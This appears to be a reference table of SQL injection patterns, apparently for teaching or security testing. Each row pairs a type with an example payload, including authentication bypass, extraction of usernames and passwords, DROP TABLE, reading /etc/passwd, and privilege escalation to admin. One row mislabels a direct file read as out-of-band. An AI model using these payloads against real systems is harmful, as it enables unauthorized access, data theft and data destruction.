| Pattern Type                  | Example User Input                               | Effect / Goal                                                |
|--------------------------------|--------------------------------------------------|--------------------------------------------------------------|
| **Tautology Injection / Authentication Bypass** | `' OR '1'='1 --`                                 | Makes condition always true; in login queries, bypasses authentication |
| **Union-based Injection**     | `' UNION SELECT username, password FROM users --`| Extracts data from other tables                              |
| **Comment Injection**         | `admin' --`                                       | Comments out the rest of the SQL query                       |
| **Piggybacked Queries**       | `1; DROP TABLE users --`                          | Executes an additional malicious query                       |
| **Boolean-based Blind**       | `' AND 1=1 --`                                   | Infers data based on true/false responses                    |
| **Time-based Blind**          | `' OR IF(1=1, SLEEP(5), 0) --`                    | Uses delays to detect vulnerabilities without direct output  |
| **Out-of-Band (OOB)**         | `' UNION SELECT LOAD_FILE('/etc/passwd') --`      | Reads server files or triggers external requests             |
| **Order By Injection**        | `' ORDER BY 5 --`                                 | Used to guess number of columns in the query                 |
| **Stacked Queries**           | `1; UPDATE users SET role='admin' WHERE id=1 --`  | Executes multiple SQL commands in a single request           |
